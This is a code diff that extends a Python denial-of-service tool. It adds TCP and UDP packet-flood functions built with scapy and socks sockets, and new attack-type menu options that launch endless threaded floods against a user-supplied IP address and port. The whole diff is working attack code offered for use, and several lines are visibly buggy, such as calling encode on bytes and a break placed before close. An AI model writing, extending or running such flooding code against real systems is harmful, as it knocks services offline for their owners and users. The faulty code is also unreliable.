@@ -3,7 +3,7 @@
 #  [ Stolar Studio ]
 #
 
-ver = "0.1.4"
+ver = "0.1.5"
 
 def error(text):
     print("\nERROR " + text)
@@ -18,6 +18,8 @@ import configparser
 import socket
 import string
 import random
+import socks
+from scapy.all import *
 
 #threading.stack_size(64*1024)
 
@@ -81,11 +83,13 @@ if User_Agent_bool:
 #print(ua.random)
 print("Select type attack")
 print("1)REQUEST (HTTP)")
-print("2)SOCKET")
+print("2)SOCKET TCP")
+print("3)SOCKET UDP")
+print("4)SOCKET")
 type = input("type (num) = ")
 
 try:
-    if int(type) < 1 or int(type) > 2:
+    if int(type) < 1 or int(type) > 4:
         error("TYPE")
 except:
     error("TYPE")
@@ -93,16 +97,16 @@ except:
 print('-' * 35)
 
 addr = input("IP : ")
-if int(type) == 2:
+if int(type) == 2 or int(type) == 3 or int(type) == 4:
     port = input("PORT : ")
     try:
         server = (addr, int(port))
     except:
         error("PORT")
 
-    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    s.bind((get_ip(),0))
-    s.setblocking(0)
+    #s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    #s.bind((get_ip(),0))
+    #s.setblocking(0)
 
 print('-' * 35)
 
@@ -134,6 +138,44 @@ def dos_socket():
         except:
             pass
 
+def dos_socket_tcp():
+    data = random._urandom(1024)
+    p = bytes(IP(dst=str(addr))/TCP(sport=RandShort(), dport=int(port))/data)
+    while True:
+        try:
+
+            s = socks.socksocket() # создание сокета
+            s.connect((str(addr),int(port))) # подключение
+            s.send(p) # отправка
+
+            try: # отправлять другие запросы в этом же потоке
+                while True: # коэффициент умножения
+                    s.send(str.encode(p)) # кодируем запрос в байты
+            except: # если что-то пойдет не так, сокет закроется, и цикл снова запустится\
+                
+                s.close()
+        except:
+            s.close()
+    print("dibil")
+
+def dos_socket_udp():
+    data = random._urandom(1024) # рандомная дата для пакета
+    p = bytes(IP(dst=str(addr))/UDP(dport=int(port))/data)  # построение пакета udp (классика)
+    while True:
+        try:
+            #socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # команда для HTTP-проксирования
+            s = socks.socksocket() # создание сокета
+            s.connect((str(addr),int(port))) # подключение
+            s.send(p)
+            try: # отправлять другие запросы в этом же потоке
+                while True: # коэффициент умножения
+                    s.send(str.encode(p)) # кодируем запрос в байты
+            except: # если что-то пойдет не так, сокет закроется, и цикл снова запустится
+                break
+                s.close()
+        except:
+            pass
+
 counts = 0
 
 if infinity_bool:
@@ -142,6 +184,10 @@ if infinity_bool:
             if int(type) == 1:
                 threading.Thread(target=dos_req).start()
             elif int(type) == 2:
+                threading.Thread(target=dos_socket_tcp).start()
+            elif int(type) == 3:
+                threading.Thread(target=dos_socket_udp).start()
+            elif int(type) == 4:
                 threading.Thread(target=dos_socket).start()
             counts += 1
             sys.stdout.write('\r')
@@ -156,6 +202,10 @@ else:
         if int(type) == 1:
             threading.Thread(target=dos_req).start()
         elif int(type) == 2:
+            threading.Thread(target=dos_socket_tcp).start()
+        elif int(type) == 3:
+            threading.Thread(target=dos_socket_udp).start()
+        elif int(type) == 4:
             threading.Thread(target=dos_socket).start()
         sys.stdout.write('\r')
         sys.stdout.write("PROCESS " + str(i+1) + " STARTED")
